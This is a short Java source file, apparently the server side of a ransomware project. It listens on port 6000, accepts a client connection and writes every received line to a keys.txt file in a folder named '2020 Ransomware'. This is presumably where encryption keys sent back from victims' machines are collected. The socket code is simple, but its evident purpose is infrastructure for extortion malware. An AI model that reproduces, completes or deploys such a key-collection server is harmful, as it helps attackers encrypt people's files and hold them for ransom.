import java.io.*;
import java.net.*;

public class server{

	public static final int SERVERPORT = 6000;
	public static final int SERVERPORT2 = 5000;

	public static void main(String[] args) throws IOException {


		ServerSocket serverSocket = new ServerSocket(SERVERPORT);
		//ServerSocket serverSocket2 = new ServerSocket(SERVERPORT2);

		System.out.println("Waiting for client");

		Socket s = serverSocket.accept();
		System.out.println("client 1 connected");

		//Socket s2 = serverSocket2.accept();
		//System.out.println("client 2 connected");

		BufferedWriter bw = new BufferedWriter(new FileWriter("C:\\Users\\Quan Pham\\Desktop\\Projects\\2020 Ransomware\\keys.txt"));

		String str = null;

		BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));

		while ((str = br.readLine()) != null) {
		System.out.println("client sent: " + str);
		bw.write(str + "\n");
		}
		s.close();

		/*
		BufferedReader br2 = new BufferedReader(new InputStreamReader(s2.getInputStream()));

		while ((str = br2.readLine()) != null) {
		System.out.println("client sent: " + str);
		bw.write(str + "\n");
		}
		s2.close();
		*/

		bw.flush();
		bw.close();


	}
}